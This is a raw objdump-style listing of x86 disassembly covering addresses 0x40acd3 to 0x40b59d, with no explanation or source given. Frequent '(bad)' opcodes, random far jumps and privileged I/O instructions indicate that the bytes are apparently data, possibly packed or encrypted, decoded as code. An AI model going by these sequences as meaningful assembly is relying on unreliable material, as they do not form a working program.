  40acd3:	dec    BYTE PTR [eax+0x6c9ef443]
  40acd9:	add    bh,bh
	...
  40acef:	add    BYTE PTR [ebx+0x3914e6f6],dh
  40acf5:	clc    
  40acf6:	std    
  40acf7:	or     edi,DWORD PTR [esi]
  40acf9:	or     BYTE PTR [ecx+edi*1-0x7cfffa31],al
  40ad00:	mov    ebx,0x420efefa
  40ad05:	daa    
  40ad06:	add    DWORD PTR [eax],eax
  40ad08:	mov    esi,0xb9003685
  40ad0d:	and    DWORD PTR [ecx+eax*1],0x8b5005ce
  40ad14:	xchg   ebx,eax
  40ad15:	cli    
  40ad16:	inc    eax
  40ad17:	push   edx
  40ad18:	imul   ecx,DWORD PTR es:[ebx-0x76a2f601],0x73f7f645
  40ad23:	hlt    
  40ad24:	stc    
  40ad25:	jno    0x40ad0f
  40ad27:	push   edx
  40ad28:	out    0x91,al
  40ad2a:	mov    edi,edi
  40ad2c:	jmp    0x8f30f0f0
  40ad31:	add    eax,0x41c10000
  40ad36:	in     al,dx
  40ad37:	add    BYTE PTR [esi+0x5],bh
  40ad3a:	add    BYTE PTR [ebx+0x413f644b],al
  40ad40:	dec    esi
  40ad41:	add    eax,0x83a75275
  40ad46:	dec    esp
  40ad47:	inc    eax
  40ad48:	out    0xeb,al
  40ad4a:	jmp    0xcf50:0x2ebe329
  40ad51:	test   eax,0x4142
	...
  40ad66:	add    BYTE PTR [eax],al
  40ad68:	add    BYTE PTR [edi+0x3fe875f0],ah
  40ad6e:	pop    ss
  40ad6f:	pop    edi
  40ad70:	add    BYTE PTR [edi-0x408c3d0c],ah
  40ad76:	push   ebx
  40ad77:	push   edi
  40ad78:	inc    eax
  40ad79:	data16 jmp 0x40ad66
  40ad7c:	or     eax,0x5002eb6b
  40ad81:	(bad)  
  40ad82:	push   ss
  40ad83:	inc    esp
  40ad84:	inc    ecx
  40ad85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad86:	mov    eax,0x7affe875
  40ad8b:	pop    esi
  40ad8c:	add    BYTE PTR [edi-0x6a8c3d1c],ah
  40ad92:	adc    ebx,DWORD PTR [edi+0x40]
  40ad95:	data16 jmp 0x40ad82
  40ad98:	icebp  
  40ad99:	ins    BYTE PTR es:[edi],dx
  40ad9a:	jmp    0x40ad9e
  40ad9c:	push   eax
  40ad9d:	aas    
  40ad9e:	es inc esp
  40ada0:	inc    ecx
  40ada1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ada2:	xor    BYTE PTR [ebp-0x18],0xcf
  40ada6:	dec    esi
  40ada7:	pop    esi
  40ada8:	add    BYTE PTR [edi+0x41681a84],ah
  40adae:	sub    eax,DWORD PTR [ebx+0x0]
  40adb1:	pop    DWORD PTR [edx+0x58]
  40adb4:	add    BYTE PTR [edi-0x18999547],ah
  40adba:	stos   BYTE PTR es:[edi],al
  40adbb:	add    bh,bh
  40adbd:	adc    al,BYTE PTR [edx-0x15]
  40adc0:	jns    0x40ada4
  40adc2:	jmp    0xafa7b8c9
  40adc7:	ins    BYTE PTR es:[edi],dx
  40adc8:	(bad)  
  40adc9:	jmp    0x0:0x6a5335
	...
  40ade0:	add    BYTE PTR [eax],al
  40ade2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ade3:	sub    BYTE PTR [esi-0x8],dh
  40ade6:	dec    edi
  40ade7:	add    esi,DWORD PTR [edx+0x1df859fd]
  40aded:	jbe    0x40ae4a
  40adef:	push   ebx
  40adf0:	add    DWORD PTR [esi+0x4a],eax
  40adf3:	clc    
  40adf4:	or     eax,0x73f2eb8a
  40adf9:	inc    esi
  40adfa:	xor    edx,DWORD PTR [ebx-0x6d]
  40adfd:	add    DWORD PTR [eax],esi
  40adff:	outs   dx,BYTE PTR ds:[esi]
  40ae00:	icebp  
  40ae01:	jmp    0x6e21:0xfbedf877
  40ae08:	fst    QWORD PTR [edi+ecx*1+0x2c]
  40ae0c:	fdiv   st(3),st
  40ae0e:	adc    DWORD PTR [edx+0x7625e82b],ecx
  40ae14:	rol    DWORD PTR [ebx+edi*2],0x2e
  40ae18:	push   0x79
  40ae1a:	or     eax,DWORD PTR [ebx]
  40ae1c:	xor    eax,0xe9027f2a
  40ae21:	jmp    0xf8cf:0xc33f82a
  40ae28:	outs   dx,BYTE PTR ds:[esi]
  40ae29:	sti    
  40ae2a:	fincstp 
  40ae2c:	adc    ebp,esp
  40ae2e:	shr    DWORD PTR [ebp-0x1f],1
  40ae31:	jmp    0x40aea6
  40ae33:	jg     0x40adc2
  40ae35:	sti    
  40ae36:	shr    DWORD PTR [ebp+0x79],0xfb
  40ae3a:	xor    ecx,DWORD PTR [edx]
  40ae3c:	xchg   ecx,eax
  40ae3d:	dec    esi
  40ae3e:	sub    al,bh
  40ae40:	jne    0x40ae3d
  40ae42:	xor    esp,esi
  40ae44:	ins    DWORD PTR es:[edi],dx
  40ae45:	jno    0x40ae47
	...
  40ae5b:	scas   eax,DWORD PTR es:[edi]
  40ae5c:	jmp    0x715d:0xf7998325
  40ae63:	xchg   edi,eax
  40ae64:	jmp    0x714d:0xf7898da4
  40ae6b:	xchg   ebx,eax
  40ae6c:	jmp    0x713d:0xf7798dac
  40ae73:	jg     0x40ae5f
  40ae75:	push   esp
  40ae77:	sbb    bh,al
  40ae79:	inc    BYTE PTR [eax+0x35]
  40ae7c:	cmc    
  40ae7d:	(bad)  
  40ae7e:	es pop esp
  40ae80:	outs   dx,BYTE PTR ds:[esi]
  40ae81:	cld    
  40ae82:	push   ds
  40ae83:	mov    dh,0x45
  40ae85:	aas    
  40ae86:	test   al,0xa4
  40ae88:	add    ebx,0xffffffe5
  40ae8b:	dec    esp
  40ae8c:	nop
  40ae8d:	sti    
  40ae8e:	push   es
  40ae8f:	cmp    al,0xca
  40ae91:	rcr    ecx,0xa4
  40ae94:	dec    ebp
  40ae95:	mov    eax,DWORD PTR ds:0xee006cd0
  40ae9b:	xchg   edi,eax
  40ae9c:	or     ch,al
  40ae9e:	call   0x53ec:0x72fef82f
  40aea5:	call   0x4318a3
  40aeaa:	loop   0x40ae90
  40aeac:	jb     0x40aec9
  40aeae:	jmp    0x2f24:0xdbeb3ee1
  40aeb5:	or     eax,0x3782a63d
  40aeba:	jecxz  0x40af13
  40aebc:	std    
  40aebd:	(bad)
	...
  40aed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aed5:	jmp    0x40aed8
  40aed7:	xchg   edx,eax
  40aed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed9:	dec    edx
  40aeda:	cmp    ebp,DWORD PTR [edx-0x557513af]
  40aee0:	popa   
  40aee1:	leave  
  40aee2:	shr    ebp,0xa4
  40aee5:	dec    ebp
  40aee6:	mov    ecx,DWORD PTR [ebp+0x1eb3c329]
  40aeec:	lods   al,BYTE PTR ds:[esi]
  40aeed:	ins    DWORD PTR es:[edi],dx
  40aeee:	or     al,0x81
  40aef0:	push   ecx
  40aef1:	mov    dh,bh
  40aef3:	test   ax,0x74c2
  40aef7:	in     al,0xed
  40aef9:	retf   
  40aefa:	sar    ecx,0xa4
  40aefd:	cmc    
  40aefe:	je     0x40aedd
  40af00:	mov    WORD PTR [ecx-0x71eff55],es
  40af06:	or     eax,eax
  40af08:	cmp    al,BYTE PTR [ebx]
  40af0a:	pop    edi
  40af0b:	leave  
  40af0c:	mov    esp,0x1bff0011
  40af11:	push   es
  40af12:	push   DWORD PTR [ebp+0x5e]
  40af15:	jmp    0x458b:0xf8b1fb69
  40af1c:	scas   al,BYTE PTR es:[edi]
  40af1d:	push   ecx
  40af1e:	push   DWORD PTR [ebp+0x62]
  40af21:	jmp    0xc009:0xf8a18f3f
  40af28:	inc    ecx
  40af29:	jbe    0x40af25
  40af2b:	add    bh,BYTE PTR [esi]
  40af2d:	add    bh,bh
  40af2f:	jne    0x40af43
  40af31:	cld    
  40af32:	jae    0x40af2c
  40af34:	idiv   BYTE PTR [edx+edx*4+0xff]
	...
  40af4b:	add    BYTE PTR [eax],al
  40af4d:	icebp  
  40af4e:	pop    es
  40af4f:	ror    BYTE PTR [edi],0x7a
  40af52:	fild   DWORD PTR [eax]
  40af54:	add    BYTE PTR [esi],cl
  40af56:	mov    DWORD PTR [ebx-0x14],eax
  40af59:	jne    0x40af51
  40af5b:	jle    0x40af9c
  40af5d:	dec    BYTE PTR [edx]
  40af5f:	test   cl,cl
  40af61:	cld    
  40af62:	add    DWORD PTR [eax],eax
  40af64:	push   edi
  40af65:	out    0x45,al
  40af67:	(bad)  
  40af68:	inc    DWORD PTR [ecx]
  40af6a:	mov    al,BYTE PTR [ebx-0x30]
  40af6d:	xor    DWORD PTR [esi-0x30],esp
  40af70:	push   0x413c03
  40af75:	es push ss
  40af77:	pop    ebx
  40af78:	add    dh,cl
  40af7a:	push   ecx
  40af7b:	push   DWORD PTR [ebp+0xe]
  40af7e:	sar    DWORD PTR [bx],1
  40af81:	jg     0x40af81
  40af83:	out    0x17,eax
  40af85:	mov    ch,0xfe
  40af87:	dec    DWORD PTR [edi+0x1]
  40af8a:	data16 shr BYTE PTR [eax-0x25],1
  40af8e:	cmp    eax,DWORD PTR [ecx+0x0]
  40af91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af92:	inc    ebx
  40af93:	or     ebx,DWORD PTR [ebx-0x59]
  40af96:	jmp    0x40aff4
  40af98:	pop    ecx
  40af99:	lods   al,BYTE PTR ds:[esi]
  40af9a:	sub    esi,DWORD PTR [eax+0xc]
  40af9d:	pushf  
  40af9e:	sbb    DWORD PTR [eax+0x8],esi
  40afa1:	pushf  
  40afa2:	and    cl,BYTE PTR [ecx]
  40afa4:	test   edx,esp
  40afa6:	jmp    0x32ecafad
  40afab:	outs   dx,DWORD PTR ds:[esi]
  40afac:	or     DWORD PTR [eax-0x62],ebp
  40afaf:	scas   al,BYTE PTR es:[edi]
	...
  40afc4:	add    BYTE PTR [eax],al
  40afc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afc7:	jmp    0x40afcb
  40afc9:	jmp    0x40af73
  40afcb:	sbb    al,0x3f
  40afcd:	mov    ah,0xa7
  40afcf:	jmp    0x40afd3
  40afd1:	add    BYTE PTR [ebx],dh
  40afd3:	mov    eax,0xec28b8c2
  40afd8:	idiv   esi
  40afda:	adc    eax,0x92073c35
  40afdf:	jmp    0x40afa0
  40afe1:	inc    esp
  40afe2:	(bad)  
  40afe3:	jmp    0x38:0x6ba70002
  40afea:	mov    al,0x5f
  40afec:	dec    esp
  40afed:	add    ah,BYTE PTR [edi-0x2f17b015]
  40aff3:	mov    ah,0xf7
  40aff5:	(bad)  
  40aff6:	push   ds
  40aff7:	es enter 0x6282,0xc3
  40affc:	add    dh,BYTE PTR [ebp-0x7a]
  40afff:	adc    eax,edi
  40b001:	sub    esp,DWORD PTR [esi-0x15]
  40b004:	div    DWORD PTR [ebx+ebx*8-0x7e]
  40b008:	test   eax,0xbeba759
  40b00d:	shr    BYTE PTR [eax-0x58fdf99a],0xeb
  40b014:	mov    edi,0x2e9bf44
  40b019:	add    BYTE PTR [edi-0x58fdfe7e],ah
  40b01f:	add    ch,cl
  40b021:	test   BYTE PTR [ebx],dl
  40b023:	jmp    0x40b00c
  40b025:	outs   dx,BYTE PTR ds:[esi]
  40b026:	cwde   
  40b027:	mov    ebx,edx
  40b029:	fild   WORD PTR [eax]
	...
  40b03f:	imul   edi,DWORD PTR [esi],0x2a70541
  40b045:	jmp    0xe942eb34
  40b04a:	add    esp,DWORD PTR [esi+esi*2]
  40b04d:	inc    ecx
  40b04e:	add    eax,0x766003da
  40b053:	inc    edi
  40b054:	mov    esp,0x2a5ebab
  40b059:	jmp    0xe7e2ee61
  40b05e:	add    esp,DWORD PTR [edi-0x5a147481]
  40b064:	ins    DWORD PTR es:[edi],dx
  40b065:	test   BYTE PTR [edx+0x3e25d6b3],0x3f
  40b06c:	(bad)  
  40b06d:	call   0x5d2a5775
  40b072:	add    ah,BYTE PTR [edi-0x8695fe]
  40b078:	(bad)  
  40b079:	push   ebx
  40b07a:	pop    es
  40b07b:	push   ds
  40b07c:	jbe    0x40b02f
  40b07e:	mov    edi,0x3e3ea6b
  40b083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b084:	add    dl,al
  40b086:	outs   dx,DWORD PTR ds:[esi]
  40b087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b088:	add    ch,cl
  40b08a:	sub    BYTE PTR [ebx-0x16],0xeb
  40b08e:	push   es
  40b08f:	sub    ah,BYTE PTR [ebx-0x18]
  40b092:	add    esp,DWORD PTR [edi+0x25d02389]
  40b098:	jbe    0x40b0ef
  40b09a:	add    al,0x53
  40b09c:	or     DWORD PTR [esi-0x16ff30bf],ebp
  40b0a2:	add    eax,DWORD PTR [eax]
	...
  40b0b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0b9:	out    0xed,eax
  40b0bb:	mov    esi,0x3e6ea6b
  40b0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c1:	add    al,BYTE PTR [eax]
  40b0c3:	scas   al,BYTE PTR es:[edi]
  40b0c4:	out    0xc2,al
  40b0c6:	(bad)  
  40b0c7:	call   0xad07b370
  40b0cc:	pop    esp
  40b0cd:	repz (bad) 
  40b0cf:	jmp    0x2d856c78
  40b0d4:	stos   DWORD PTR es:[edi],eax
  40b0d5:	add    al,BYTE PTR [eax]
  40b0d7:	jmp    0xe9fcef15
  40b0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0dd:	add    al,BYTE PTR [eax]
  40b0df:	es out 0xba,al
  40b0e2:	(bad)  
  40b0e3:	call   0xb53fb38c
  40b0e8:	js     0x40b0c5
  40b0ea:	adc    ah,BYTE PTR [edi]
  40b0ec:	pop    eax
  40b0ed:	hlt    
  40b0ee:	mov    BYTE PTR [esp+eiz*2+0x533574f4],ah
  40b0f5:	sti    
  40b0f6:	std    
  40b0f7:	push   cs
  40b0f8:	xor    BYTE PTR [edx+0x6e383144],cl
  40b0fe:	aam    0x11
  40b100:	cs idiv dh
  40b103:	div    BYTE PTR [ebx]
  40b105:	les    ebp,FWORD PTR ds:[edx-0x22]
  40b109:	popa   
  40b10a:	aas    
  40b10b:	sub    BYTE PTR [ebx+0x7b3b7502],ch
  40b111:	inc    esp
  40b112:	inc    eax
  40b113:	sub    BYTE PTR [ebx-0x5ccff316],ch
  40b119:	add    dl,BYTE PTR [eax+0x51]
	...
  40b130:	add    BYTE PTR [ecx+0x42],ch
  40b133:	inc    ecx
  40b134:	jmp    0xc2011f2a
  40b139:	or     DWORD PTR [ecx+0x0],ebx
  40b13c:	jmp    0x1b473ee
  40b141:	inc    ebx
  40b142:	dec    ebp
  40b143:	inc    eax
  40b144:	sub    BYTE PTR [ebx-0x54ce0f16],ah
  40b14a:	add    dl,BYTE PTR [eax+0x1]
  40b14d:	push   esi
  40b14e:	inc    edx
  40b14f:	inc    ecx
  40b150:	add    BYTE PTR [esi+0x16c073eb],bh
  40b156:	nop
  40b157:	pop    eax
  40b158:	add    BYTE PTR [esi+0x5c74bffd],cl
  40b15e:	pop    esi
  40b15f:	pop    ebp
  40b160:	inc    eax
  40b161:	aas    
  40b162:	push   es
  40b163:	call   0x47183d
  40b168:	push   eax
  40b169:	dec    bx
  40b16b:	inc    eax
  40b16c:	inc    ecx
  40b16d:	mov    ?,ecx
  40b16f:	jae    0x40b131
  40b171:	(bad)  
  40b172:	pusha  
  40b173:	pop    edx
  40b174:	add    BYTE PTR [esi-0x23],bh
  40b177:	push   ss
  40b178:	push   0x414670
  40b17d:	out    0xac,al
  40b17f:	push   esi
  40b180:	add    BYTE PTR [esi],bh
  40b182:	push   esi
  40b183:	push   0x46fe66
  40b188:	jmp    DWORD PTR [ebx]
  40b18a:	(bad)  
  40b18b:	out    0x5d,al
  40b18d:	hlt    
  40b18e:	add    eax,0x727e0b00
  40b193:	(bad)  
  40b194:	inc    DWORD PTR [eax]
	...
  40b1aa:	mov    bl,0xbd
  40b1ac:	out    0xa1,al
  40b1ae:	ss push es
  40b1b0:	add    BYTE PTR [eax+0x9],dl
  40b1b3:	(bad)  
  40b1b4:	enter  0xb8e8,0xec
  40b1b8:	std    
  40b1b9:	call   DWORD PTR [edi+0x63ffbc31]
  40b1bf:	ret    0x8de6
  40b1c2:	mov    dh,0x6
  40b1c4:	add    BYTE PTR [eax-0x17],dl
  40b1c7:	popa   
  40b1c8:	(bad)  
  40b1c9:	call   0x3e9dd2
  40b1ce:	inc    edi
  40b1cf:	xor    DWORD PTR [eax-0x139747d],edi
  40b1d5:	jae    0x40b1c9
  40b1d7:	cmp    BYTE PTR [ebx-0x48],0xbe
  40b1db:	popa   
  40b1dc:	cs push 0xef02dba7
  40b1e2:	stc    
  40b1e3:	sub    BYTE PTR [esi+0x8],0xbf
  40b1e7:	xchg   esi,eax
  40b1e8:	cmp    dh,0xa8
  40b1eb:	jo     0x40b25c
  40b1ed:	shl    BYTE PTR [eax-0x1c17f512],0x67
  40b1f4:	cmc    
  40b1f5:	(bad)  
  40b1f6:	nop
  40b1f7:	into   
  40b1f8:	mov    dh,0xfe
  40b1fa:	adc    dh,ah
  40b1fc:	jmp    0xf2fe:0xf5582b38
  40b203:	xchg   ebx,eax
  40b204:	hlt    
  40b205:	je     0x40b1a6
  40b207:	push   ebx
  40b208:	test   BYTE PTR es:[eax+0x30],ch
  40b20c:	cmc    
  40b20d:	je     0x40b20f
	...
  40b223:	addr16 inc ebx
  40b225:	cmp    DWORD PTR [edi+0x74f52058],eax
  40b22b:	pop    edi
  40b22c:	adc    esi,DWORD PTR [ecx]
  40b22e:	xchg   DWORD PTR [eax+0x10],ecx
  40b231:	cmc    
  40b232:	je     0x40b29f
  40b234:	add    ebp,DWORD PTR [ecx]
  40b236:	xchg   DWORD PTR [eax],edi
  40b238:	add    ch,dh
  40b23a:	je     0x40b22f
  40b23c:	adc    ah,BYTE PTR [ecx]
  40b23e:	xchg   DWORD PTR [eax],ebp
  40b240:	lock repz je 0x40b2a3
  40b244:	add    ebx,DWORD PTR [ecx]
  40b246:	xchg   DWORD PTR [eax],ebx
  40b248:	loopne 0x40b231
  40b24a:	or     al,0x24
  40b24c:	data16 in al,dx
  40b24e:	add    eax,0x44bbe892
  40b253:	paddusw mm0,QWORD PTR [edx]
  40b256:	add    BYTE PTR [edi-0x581789a4],ah
  40b25c:	das    
  40b25d:	xor    al,0x68
  40b25f:	(bad)  
  40b261:	inc    edx
  40b262:	add    al,ah
  40b264:	sub    eax,0x1310e7c8
  40b269:	add    al,0x0
  40b26b:	pushf  
  40b26c:	add    ch,BYTE PTR [ecx+0x23c9a06e]
  40b272:	in     al,dx
  40b273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b274:	add    ch,cl
  40b276:	add    ecx,DWORD PTR [edi+0x3c]
  40b279:	sub    DWORD PTR [ebx-0x59],eax
  40b27c:	icebp  
  40b27d:	sti    
  40b27e:	mov    eax,0xa7042090
  40b284:	sti    
  40b285:	test   al,0x6e
	...
  40b29b:	add    BYTE PTR [eax-0x5913dc39],ah
  40b2a1:	add    ch,cl
  40b2a3:	add    ecx,DWORD PTR [eax+0x72eb2d76]
  40b2a9:	mov    DWORD PTR [ebp-0xc],edx
  40b2ac:	jl     0x40b2e2
  40b2ae:	sub    DWORD PTR [edx-0xbba0f8f],edi
  40b2b4:	jbe    0x40b257
  40b2b6:	add    ch,bh
  40b2b8:	mov    cl,0x85
  40b2ba:	test   dh,dh
  40b2bc:	pop    ecx
  40b2bd:	lock sub eax,0x5cdb776e
  40b2c3:	jge    0x40b30e
  40b2c5:	lock sbb eax,0x44db536e
  40b2cb:	jge    0x40b306
  40b2cd:	lock pop ebx
  40b2cf:	ds aaa 
  40b2d1:	push   ebx
  40b2d2:	adc    ecx,edx
  40b2d4:	sbb    al,0xf0
  40b2d6:	std    
  40b2d7:	jmp    0xb979:0xf3f5e9b1
  40b2de:	sub    dl,BYTE PTR [ebx]
  40b2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e1:	push   ebp
  40b2e2:	jb     0x40b2c4
  40b2e4:	daa    
  40b2e5:	(bad)  
  40b2e6:	xchg   esp,eax
  40b2e7:	repnz add eax,esi
  40b2ea:	lods   eax,DWORD PTR ds:[esi]
  40b2eb:	mov    DWORD PTR [eax],esi
  40b2ed:	icebp  
  40b2ee:	int    0xf3
  40b2f0:	lock out dx,eax
  40b2f2:	call   0xd586cefa
  40b2f7:	(bad)  
  40b2f8:	and    BYTE PTR [edi+0x0],dh
  40b2fb:	in     al,dx
  40b2fc:	and    al,0x38
  40b2fe:	add    BYTE PTR [eax+eax*1],dh
	...
  40b315:	sahf   
  40b316:	fxtract 
  40b318:	call   0x153fb5c1
  40b31d:	lahf   
  40b31e:	ficomp DWORD PTR [ebp+0x78]
  40b321:	mov    ah,0xf0
  40b323:	or     ch,BYTE PTR [ecx-0x649800d2]
  40b329:	xchg   DWORD PTR [ecx+0x0],eax
  40b32c:	jle    0x40b34c
  40b32e:	pop    ss
  40b32f:	call   0xff31cda6
  40b334:	and    BYTE PTR [esi-0x1dea28a6],0x2
  40b33b:	call   esp
  40b33d:	cwde   
  40b33e:	(bad)  
  40b340:	pusha  
  40b341:	je     0x40b333
  40b343:	mov    BYTE PTR [ebx+eax*2-0x13],ah
  40b347:	inc    BYTE PTR [esi-0x35]
  40b34a:	xor    BYTE PTR [ecx],al
  40b34c:	jmp    0x2bc530f5
  40b351:	push   ebp
  40b352:	lock (bad) 
  40b354:	cdq    
  40b355:	ins    BYTE PTR es:[edi],dx
  40b356:	arpl   WORD PTR [esi-0x7b81abda],ax
  40b35c:	sub    esi,DWORD PTR ds:0x35b9fef0
  40b362:	mov    dh,0xb7
  40b364:	sysenter 
  40b366:	lock out 0x49,eax
  40b369:	int3   
  40b36a:	add    al,BYTE PTR [eax]
  40b36c:	jo     0x40b39c
  40b36e:	stos   DWORD PTR es:[edi],eax
  40b36f:	std    
  40b370:	not    BYTE PTR ds:0x2c650f2f
  40b376:	add    al,BYTE PTR [eax]
  40b378:	jmp    0x40b37d
	...
  40b38d:	add    BYTE PTR [edi],ah
  40b38f:	xchg   esi,eax
  40b390:	rcr    edi,0xf5
  40b393:	out    dx,eax
  40b394:	imul   bl
  40b396:	xchg   esp,eax
  40b397:	add    al,BYTE PTR [eax]
  40b399:	jmp    0xc33a43
  40b39e:	inc    BYTE PTR [edx]
  40b3a0:	add    BYTE PTR [ebp+0x6850228c],cl
  40b3a6:	add    ecx,DWORD PTR [edi]
  40b3a8:	inc    ecx
  40b3a9:	add    dh,ah
  40b3ab:	pop    ebp
  40b3ac:	push   edi
  40b3ad:	add    BYTE PTR [esi-0x348a4111],bh
  40b3b3:	int    0x47
  40b3b5:	add    esi,ecx
  40b3b7:	add    cl,BYTE PTR [ebp-0x20f036b]
  40b3bd:	push   DWORD PTR [ebx]
  40b3bf:	inc    ebp
  40b3c0:	sub    al,0x50
  40b3c2:	mov    dh,0xc1
  40b3c4:	sub    al,BYTE PTR [ecx-0x72]
  40b3c7:	retf   0x575a
  40b3ca:	jle    0x40b3ce
  40b3cc:	or     eax,eax
  40b3ce:	imul   edi,ebx,0xffffffe8
  40b3d1:	sub    al,0x8f
  40b3d3:	add    al,BYTE PTR [eax]
  40b3d5:	call   FWORD PTR [ebx+0x16]
  40b3d8:	call   0xfe31a297
  40b3dd:	or     edi,DWORD PTR [esi-0x1097f096]
  40b3e3:	or     DWORD PTR [ecx+0x0],eax
  40b3e6:	xchg   ecx,eax
  40b3e7:	push   0x14
  40b3e9:	call   0x3f2327
  40b3ee:	mov    ch,0xef
  40b3f0:	push   0x0
	...
  40b405:	add    BYTE PTR [eax],al
  40b407:	mov    eax,ds:0x5e8146a
  40b40c:	outs   dx,DWORD PTR ds:[esi]
  40b40d:	(bad)  
  40b40e:	call   ebx
  40b410:	mov    al,al
  40b412:	(bad)  
  40b413:	mov    eax,ds:0xf2528bf0
  40b418:	push   edi
  40b419:	push   eax
  40b41a:	call   0x3f22a0
  40b41f:	cs push edx
  40b421:	push   DWORD PTR [ebp+0xe]
  40b424:	repz jae 0x40b433
  40b427:	loope  0x40b49e
  40b429:	or     al,ch
  40b42b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b42c:	enter  0xfef1,0xf0
  40b430:	ret    
  40b431:	mov    BYTE PTR [eax+ebp*8-0x5823253c],al
  40b438:	fild   DWORD PTR [edx]
  40b43a:	lea    esp,[ebp+0x7]
  40b43d:	jnp    0x40b3c3
  40b43f:	sbb    ebx,DWORD PTR [esi-0x7cc00110]
  40b445:	xor    BYTE PTR [ecx-0x59],al
  40b448:	mov    WORD PTR [esi-0xf6b464d],?
  40b44e:	out    0xaa,eax
  40b450:	xor    eax,DWORD PTR [eax+eax*1]
  40b453:	pushf  
  40b454:	fwait
  40b455:	ja     0x40b485
  40b457:	(bad)  
  40b459:	sbb    eax,DWORD PTR [ecx-0x59]
  40b45c:	je     0x40b4d5
  40b45e:	adc    al,0x7f
  40b460:	je     0x40b4de
  40b462:	dec    BYTE PTR [eax-0x7e4c489c]
  40b468:	dec    esp
  40b469:	icebp  
  40b46a:	dec    edi
	...
  40b47f:	add    BYTE PTR [edi+0x70fe7b14],cl
  40b485:	stos   DWORD PTR es:[edi],eax
  40b486:	out    dx,eax
  40b487:	je     0x40b420
  40b489:	inc    esp
  40b48a:	ja     0x40b498
  40b48c:	imul   DWORD PTR [edi+esi*2]
  40b48f:	or     BYTE PTR [edi+0x34],cl
  40b492:	in     al,dx
  40b493:	(bad)  
  40b494:	push   eax
  40b495:	inc    ebx
  40b496:	cmp    DWORD PTR [ebp-0x4b0edbb8],eax
  40b49c:	sti    
  40b49d:	or     al,0xf1
  40b49f:	dec    BYTE PTR [edi-0x35]
  40b4a2:	pop    eax
  40b4a3:	add    BYTE PTR [edi-0x4afe13a8],ah
  40b4a9:	iret   
  40b4aa:	jnp    0x40b440
  40b4ac:	pop    ebx
  40b4ad:	in     eax,dx
  40b4ae:	out    dx,eax
  40b4af:	(bad)  
  40b4b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4b1:	or     eax,DWORD PTR [ebp-0x7e7a5a17]
  40b4b7:	cmp    DWORD PTR [ecx-0x5a88a5fe],edi
  40b4bd:	fldcw  WORD PTR [eax]
  40b4bf:	pop    esp
  40b4c0:	inc    eax
  40b4c1:	sub    eax,0xb6f00428
  40b4c6:	xchg   esp,eax
  40b4c7:	icebp  
  40b4c8:	jmp    0x79d185b9
  40b4cd:	add    ch,cl
  40b4cf:	push   ebx
  40b4d0:	dec    edi
  40b4d1:	mov    cl,0xf5
  40b4d3:	inc    edx
  40b4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d5:	in     eax,dx
  40b4d6:	jae    0x40b48f
  40b4d8:	retf   0xa5ec
  40b4db:	(bad)  [edx]
  40b4dd:	push   ebp
  40b4de:	jmp    0xa99b0be6
  40b4e3:	xor    BYTE PTR [eax],al
	...
  40b4f9:	data16 add cl,BYTE PTR [esi-0x7a140b4a]
  40b500:	lock mov BYTE PTR [esi+0x16],ch
  40b504:	add    al,0xa7
  40b506:	dec    eax
  40b507:	adc    ch,bh
  40b509:	push   eax
  40b50a:	jbe    0x40b4ed
  40b50c:	cld    
  40b50d:	jbe    0x40b585
  40b50f:	in     eax,dx
  40b510:	cld    
  40b511:	outs   dx,DWORD PTR ds:[esi]
  40b512:	ja     0x40b523
  40b514:	pop    esp
  40b515:	xchg   BYTE PTR [ebx],bl
  40b517:	test   al,0x3
  40b519:	jo     0x40b591
  40b51b:	cmc    
  40b51c:	fild   DWORD PTR [ebx]
  40b51e:	jnp    0x40b565
  40b520:	lock popa 
  40b522:	mov    dh,0x74
  40b524:	icebp  
  40b525:	pop    ecx
  40b526:	in     al,dx
  40b527:	cwde   
  40b528:	fild   DWORD PTR [ebx]
  40b52a:	jnp    0x40b559
  40b52c:	lock fsubr st,st(3)
  40b52f:	fwait
  40b530:	adc    eax,DWORD PTR [eax+0x76]
  40b533:	in     eax,dx
  40b534:	push   ebx
  40b535:	cmp    BYTE PTR [esi-0x1f],dh
  40b538:	(bad)  [ecx+ebp*8+0xd]
  40b53c:	lock inc eax
  40b53e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b53f:	ins    BYTE PTR es:[edi],dx
  40b540:	lock and DWORD PTR [esi+0x63],edi
  40b544:	lds    ebx,FWORD PTR [edx]
  40b546:	in     al,dx
  40b547:	push   ebp
  40b549:	jne    0x40b536
  40b54b:	mov    ah,0x2d
  40b54d:	push   ss
  40b54e:	in     eax,dx
  40b54f:	(bad)  
  40b550:	shr    DWORD PTR [esp+edx*2-0x53d01700],1
  40b557:	push   cs
  40b558:	ins    BYTE PTR es:[edi],dx
  40b559:	outs   dx,DWORD PTR ds:[esi]
  40b55a:	in     al,dx
  40b55b:	dec    dh
	...
  40b571:	add    al,bh
  40b573:	mov    dh,0xbb
  40b575:	(bad)  
  40b576:	shr    ah,1
  40b578:	out    0xef,eax
  40b57a:	jb     0x40b57e
  40b57c:	add    BYTE PTR [esi-0x51024bf2],dh
  40b582:	mov    eax,0xd06d74e3
  40b587:	in     al,dx
  40b588:	enter  0x93ab,0x2
  40b58c:	push   ebp
  40b58d:	(bad)  
  40b58e:	(bad)  
  40b58f:	in     al,dx
  40b590:	je     0x40b56f
  40b592:	mov    ecx,0x1e861076
  40b597:	(bad)  
  40b598:	(bad)  
  40b599:	hlt    
  40b59a:	pushf  
  40b59b:	jecxz  0x40b560
  40b59d:	je     0x40b51f
